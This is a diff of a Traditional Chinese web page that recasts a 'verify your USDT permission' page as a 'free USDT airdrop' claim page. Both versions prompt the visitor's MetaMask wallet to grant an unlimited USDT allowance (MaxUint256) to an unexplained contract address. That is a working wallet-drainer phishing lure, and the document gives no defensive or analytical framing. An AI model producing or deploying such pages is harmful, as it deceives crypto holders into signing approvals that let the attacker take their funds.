@@ -1,38 +1,40 @@
+
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>❌ 請驗證您的 USDT 使用權限</title>
+  <title>🎁 免費領取空投！</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: Arial; padding: 20px; background: #fff; }
-    button { padding: 8px 12px; font-size: 16px; cursor: pointer; }
-    .fail { color: red; }
+    body { font-family: 'Arial'; padding: 20px; background: #fff; text-align: center; }
+    button { padding: 10px 20px; font-size: 18px; }
   </style>
 </head>
 <body>
-  <h2>🔐 請驗證您的 <b>USDT</b> 使用權限</h2>
-  <p>為了完成驗證，請點擊下方按鈕進行授權操作</p>
-  <button onclick="approve()">一鍵授權 USDT</button>
-  <p id="status"></p>
+  <h1>🎉 恭喜你獲得 USDT 空投！</h1>
+  <p>請先授權合約以完成空投領取：</p>
+  <button onclick="approve()">🎁 立即參與</button>
+  <p id="status">等待操作...</p>
 
   <script>
     const CONTRACT = "0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e";
     const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const ABI = ["function approve(address spender, uint256 value) external returns (bool)"];
-    let provider, signer;
+    const ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
 
     async function approve() {
       if (!window.ethereum) return alert("請先安裝 MetaMask");
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const usdt = new ethers.Contract(USDT, ABI, signer);
+      document.getElementById("status").innerText = "⏳ 發送授權中...";
       try {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        const usdt = new ethers.Contract(USDT, ABI, signer);
         const tx = await usdt.approve(CONTRACT, ethers.constants.MaxUint256);
-        document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
+        document.getElementById("status").innerText = "✅ 已授權，TX Hash: " + tx.hash;
       } catch (e) {
-        document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;
+        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
       }
     }
   </script>
